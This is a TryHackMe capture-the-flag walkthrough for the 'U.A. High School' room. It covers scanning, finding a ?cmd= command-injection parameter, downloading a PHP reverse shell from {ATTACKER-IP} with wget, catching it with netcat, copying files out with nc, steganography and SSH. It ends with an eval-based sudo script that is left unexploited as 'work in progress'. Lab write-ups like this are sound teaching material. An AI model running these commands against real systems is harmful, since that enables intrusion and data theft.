# TryHackMe Walkthrough: U.A. High School
### By Parker Lovin

## Intro
Welcome to my walkthrough! This room is one of the most enjoyable CTFs I've completed so far. Let's get started!

## Setup
For convenience, I am adding this room to /etc/hosts so I don't have to remember the IP address.

```sudo nano /etc/hosts```

Once Nano is open, go to the end of the file and type the target IP address and the hostname (ua.thm). Your IP address will be different from mine, but it should follow this format:
`10.10.159.59  ua.thm`. Once this has been added, type CTRL X and follow the directions to save the file.

In case anyone needs context for this, /etc/hosts is a file that correlates IP addresses with hostnames. The operation we just performed means we can type "ua.thm" instead of the IP address when running future commands.


## Port scan
In nearly every CTF, I begin by performing a port scan with Nmap. Open your terminal in Kali Linux, then type `sudo nmap -sS ua.thm`
Your output should look like this:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Port scan explained
If you are fairly familiar with CTFs, feel free to skip this section of the writeup. For anyone who is new to hacking, let me explain the output of our scan.

**Port 22 -- SSH:** This is a port used to gain remote access to someone else's machine. SSH tends to be highly secure unless the password is leaked, so we will not attempt to attack it yet.

**Port 80 -- HTTP:** This means a website is running on port 80. In our next step, we will examine this website for vulnerabilities.

## Directory search
I initially wasted a few minutes manually enumerating the web page through Firefox, and I even attempted XSS (if you don't know what that is, don't worry -- you won't need it for this room).
Since this didn't work, I decided to make things easier for myself by letting Gobuster do some work for me:
`gobuster dir -u http://ua.thm -w /usr/share/wordlists/dirb/common.txt`

Results:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ua.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 271]
/.hta                 (Status: 403) [Size: 271]
/.htpasswd            (Status: 403) [Size: 271]
/assets               (Status: 301) [Size: 301] [--> http://ua.thm/assets/]
/index.html           (Status: 200) [Size: 1988]
/server-status        (Status: 403) [Size: 271]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The directory **/assets** is the most intriguing part of these results.

## Directory search explained
If you are familiar with Gobuster, feel free to skip this part of the walkthrough. For those who are new to this, here are the concepts:

A website (such as ua.thm) can have many components, and directories help organize these components. Consider a hypothetical website called http://example.com which serves as a shop. It might have a subdirectory called http://example.com/login, and this would serve as a login page. Similarly, http://example.com/search might allow a user to search for specific items.

Gobuster takes a wordlist (in this case, a list of common directory names) and searches a website for them. Here is the breakdown of the command we used:

**gobuster dir**: This tells us that we are using the gobuster command to find directories. Gobuster has other functions which are beyond the scope of this room.

**-u http://ua.thm**: This is the website Gobuster is scanning.

**-w /usr/share/wordlists/dirb/common.txt**: This is a path to a wordlist of common directory names. This is essentially telling Gobuster what directories to look for.


Now to explain the results:
A status code of 400 or greater means that we cannot access the directory. As a result, we only need to look at /index.html and /assets.

Going to Firefox and searching http://ua.thm/index.html gave me the normal web page which seems not to contain anything of value. As a result, we will scan /assets for directories.

## Directory search (/assets)
Going to Firefox and typing **http://ua.thm/assets** yields a blank page. However, I decided to search for directories within **/assets**:
`gobuster dir -u http://ua.thm/assets -w /usr/share/wordlists/dirb/common.txt`

This produced the following results:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ua.thm/assets
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 271]
/.htaccess            (Status: 403) [Size: 271]
/.htpasswd            (Status: 403) [Size: 271]
/images               (Status: 301) [Size: 308] [--> http://ua.thm/assets/images/]
/index.php            (Status: 200) [Size: 0]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

I tried using Firefox to visit http://ua.thm/assets/images, but I was denied access. We will now focus our efforts on index.php.

## Directory search (/assets) explained
As expected, you can skip this section if you understand the purpose of Gobuster. For anyone who is still learning about Gobuster, this scan follows the same logic as the previous one; however, we are scanning **http://ua.thm/assets** rather than **http://ua.thm**. As usual, we ignored the status codes greater than 400.

## index.php and remote command execution
Use Firefox to navigate to **http://ua.thm/assets/index.php**. I had two reasons for this: I couldn't think of any other attack paths, and I have often seen CTFs where php files are used to gain access.

Admittedly, this section of the writeup is mostly a lucky guess; I was genuinely shocked when it worked! In my Firefox address bar, I typed **http://ua.thm/assets/index.php?cmd=whoami**. This attempt was inspired by the Glitch TryHackMe room, which is among the most difficult rooms to still have an "Easy" rating.

The result was some encoded text: **d3d3LWRhdGEK**. I took this as a good sign since no error message appeared.

## index.php and remote command execution explained
If you understood the previous section of the walkthrough, feel free to skip this one. If you want to dive deeper into what we just did, here you go:

As I previously mentioned, typing **?cmd=whoami** was a lucky guess based on past experience. Here is what this code means:

`?cmd`: This is adding a parameter called cmd (short for "command"). When misconfigured, this parameter allows the attacker to run commands on the target system.
`=whoami`: This is the command that will be run, and it should output the name of the current user on the victim machine. This could be replaced with a number of other commands, such as `id`, but the point is that we are using a simple command to verify whether the command ran successful.

**Note:** While I consider sections like this to be fair game in CTFs, it's worth noting that I would never have guessed the answer if I hadn't completed the Glitch room previously. So if you had to get my help on this part, please don't feel badly about it! This sort of guesswork seems pretty rare in CTFs, and this truly is one of those "if you know, you know" sections. **Keep your head up and keep going!**

## Decoding the text
CyberChef is my preferred means of decoding text; if you've never used it before, you should consider adding it to your arsenal. I simply copied the encoded text (**d3d3LWRhdGEK**), navigated to the CyberChef website, pasted the text into the input field, and clicked the magic wand in the output field. It produced the output "**www-data**." This is a common username in CTFs.

By doing this, we have verified two things: our remote command execution is working, and the output is being encoded via Base64.

## Decoding the text explained
The magic wand in CyberChef triggers "magic mode" which automatically detects the type of encoding and attempts to convert it to plaintext.

## Remote command execution (RCE) to reverse shell
Right now, we have RCE through our browser, but our ability to move through the victim machine's files and change users is nearly nonexistent. We need to acquire a reverse shell; in other words, we need to gain remote access to a user account on the victim machine.

First, we need to download the script for our reverse shell. I would suggest downloading pentestmonkey's PHP reverse shell, which can be found here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php 

On your attacker machine, make sure you are in the same directory as your reverse shell. Then use `nano php-reverse-shell.php` to open this file. Navigate to line 49 and change the IP to the IP of your attacker machine. Without making this change, the script will give the shell to the wrong machine.

In the same directory, use `python3 -m http.server 80` so that your shell can be accessed through HTTP.

Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our shell onto the target machine.

On your attacker machine, use `CTRL+C` to stop your Python server. Then enter `nc -nvlp 1234` to create a listener for your reverse shell.

Return to Firefox and open a new tab. Enter **http://ua.thm/assets/php-reverse-shell.php**. It may appear that this tab is taking a while to load, but this actually indicates that your shell is successful.

Return to the terminal; if a dollar sign has appeared, you have now established a reverse shell as user www-data!

## RCE to reverse shell explained
If you need more explanation, please read this section. If not, feel free to skip to the next portion of the walkthrough.

Let's start by accepting that we don't need to understand how our PHP script works. It is a commonly used tool in CTFs, and using it is simple as long as you update the IP address to reflect your own IP.

`python3 -m http.server 80': This command is starting a web server on our machine. Think of it this way: we (the attackers) are offering the victim the opportunity to download our PHP script.

**http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php**: Now that we've offered the script to the victim, this URL causes the victim to accept and download that script. Breaking this down, `wget` is a command to download something from a remote location, **{ATTACKER-IP}** specifies where the download comes from, and **php-reverse-shell.php** specifies what file is being downloaded. Now, our script should be present in the **/assets** directory of the victim machine.

**Troubleshooting:** If the file was not successfully downloaded to the victim machine, please ensure that a) the filename is correct and b) you started your server in the same directory as the file.

`CTRL-C`: This stops the server so that we are not exposing our files to the internet longer than necessary.

`nc -nvlp 1234`: This opens your machine up to receiving a reverse shell from the target machine. Look at it this way: the PHP script is like a teammate throwing a ball to you, and the `nc -nvlp 1234` is like you opening your hand to catch it.

**Congrats on your progress so far!**

## Finding a suspicious file
It is now time for privilege escalation -- moving from user **www-data** to someone with greater access. I attempted to use common techniques such as `sudo -l` or `find / -perm /4000 2>/dev/null` to find vulnerable files, but nothing stood out. Similarly, there was nothing of interest in **/etc/crontab**.

Since these efforts did not work, I decided to take stock of what user **www-data** can do. In CTFs, **www-data** can often view sensitive files in the directory **/var/www**. I entered `cd /var/www` to access this directory, then used `ls -la` to view the files that were present. The directory **Hidden_Content** looked suspicious, so I entered `cd Hidden_Content` and then `ls -la` to view its contents.

You should see a suspicious file called **passphrase.txt**. Enter `cat passphrase.txt` to view its contents, and you will see a Base-64 encoded password. Due to the rules of TryHackMe writeups, I cannot include the encrypted password or the plaintext password here. However, pasting the encrypted password into **CyberChef**'s input field and using magic should give you the plaintext passphrase. I'd suggest writing this passphrase down somewhere; for the rest of the writeup, I will call it **PASSWORD1**.

## Hitting a roadblock and using a hint
This section of the writeup covers a failed attempt at switching to a different user. Feel free to skip this section; however, I wanted to include it because it is an important part of how I found the solution.

Anyways, here's the roadblock I struggled with for an hour: I falsely assumed that **PASSWORD1** would give me direct access to another user with greater privileges than **www-data**. I first tried to determine the other usernames by entering `ls -la /home`, which is a common technique in CTFs. After noticing a user named **deku**, I attempted to switch users by entering `su deku` and then entering PASSWORD1. However, I was unsuccessful.

At this point, I viewed the hint that the creator of the room gave us: **Once you found a way in, be suspicious of any unused files.** This led me to remember the directory we failed to access earlier: the **/assets/images** directory on the website.

## Transferring an image to our local machine
Based on this logic, I entered `cd /var/www/html/assets/images` to enter the **images** directory. Then, I used `ls -la` to view its contents, and here are the results:

```
$ ls -la
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Aug 24 18:57 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
```

I recalled that only one image was used in the victim's website, meaning one of these files must be the "unused file" referenced by the hint! I used the following to transfer it to my local machine:

`nc -l -p 4444 > oneforall.jpg' (on my attacker machine)

'nc -w 3 {ATTACKER-IP} 4444 < oneforall.jpg' (on the victim machine; remember to replace ATTACKER-IP with your individual attacker IP.

**Note**: Like the PHP script earlier, you don't have to understand the workings of these commands. Even I had to use Nakkaya.com as a reference (https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/). Long story short, remember that **these commands are moving the image to our machine** for further analysis.

## Steganography (finding hidden data in an image)
On my attacker machine, I double clicked **oneforall.jpg** to display my image. To my surprise, I received this message: **"Error interpreting JPEG image file (Not a JPEG file: starts with 0x89 0x50)."**

From this message, I deduced that there was an issue with the file signature of **oneforall.jpg**. Using exiftool (`exiftool oneforall.jpg`) confirmed this, as it listed the file type as PNG, not JPEG. I used Wikipedia to view the file signatures for PNG and JPEG, then made the proper adjustments in hexedit on my local machine.

Here are the steps to do so:

1) Enter `hexedit oneforall.jpg`, making sure you are in the same directory as the JPEG file.

2) Don't get overwhelmed by the long output; scroll to the top, and replace **89 50 4E 47 0D 0A 1A 0A** with **FF D8 FF E0 00 10 4A 46**.

3) Enter CTRL-X to exit; save your work when prompted to do so.

Now, double clicking **oneforall.jpg** should display an image properly. This means we have successfully fixed this JPEG image!

Since we have fixed the image, we can now extract information from it. In the same directory as **oneforall.jpg**, enter `steghide extract -sf oneforall.jpg` to extract hidden files from the image. When prompted for a passphrase, enter PASSWORD1.

It worked! We received a message: **wrote extracted data to "creds.txt"**

Now we need to view the contents of this file: `cat creds.txt`. The output should look like this: "deku:PASSWORD2"

**Note:** Once again, I am not allowed to include the actual password in this writeup. PASSWORD2 is simply a placeholder.

Anyways, it looks like we have Deku's SSH password!

## Steganography explained
Here is a deeper explanation if anyone needs it:

**File signatures:** Hypothetically, we could name a file almost anything we wanted. For instance, a text file could be called example.jpg, though this would cause a lot of confusion. File signatures are how the system identifies the type of a file beyond just viewing its name. In this case **oneforall.jpg** initially had an incorrect file signature, which we determined based on attempting to view the image and by using **exiftool**. Exiftool is a common means of viewing basic image metadata in CTFs. **The main point** is that we could not extract information from the image until we fixed the file signature.

**Hexedit:** This is the tool we used to replace the incorrect PNG header with the correct JPEG header. For context, I did not have these headers memorized; I merely referenced Wikipedia to find them.

`steghide extract -sf oneforall.jpg`: The `steghide extract -sf` command is often used to extract data from a JPEG file. In this case, it revealed creds.txt, which we read using `cat`.

## SSH into the system as deku
Although we ignored SSH earlier, it is now a viable means of entry since we have credentials for user deku. Enter `ssh deku@ua.thm`, and enter PASSWORD2 when prompted. We are now logged into the victim machine as user deku, which will hopefully open a route for us to become root (the user with the greatest authority).

We can now enter `cat user.txt` to obtain the flag.

## Checking sudo privileges
The **sudo** command allows one user to run commands as another user, although there are usually rules in place governing how this works on a given machine. To view those rules, we must enter `sudo -l`. If necessary, re-enter PASSWORD2.

I found this part of the output intriguing:

```
User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

So, we know that we can run the script feedback.sh as root; clearly, the creators of the room wanted us to use this as a path to privilege escalation. However, our options are limited since we cannot edit **feedback.sh** or its directory.

To better understand my situation, I entered `cat /opt/NewComponent/feedback.sh` and received the following output:

```
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

Let's analyze this script:

1) `read feedback`: The script is reading user input and storing it in the variable called **feedback**. This means we can interact with this script and (hopefully) exploit it.

2) `[[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]`: Clearly, this script is blocking the user from inputting certain characters.

3) `eval "echo $feedback"`: The eval function means that the expression `"echo $feedback"` is being evaluated. (Note that **$feedback** means we are taking the *value* of **feedback**, and that value is whatever we entered when running the program.)

**The key point of this script** is that we can provide malicious input so that the **eval** function performs a command that helps us get root access.

## Exploiting eval:
WORK IN PROGRESS
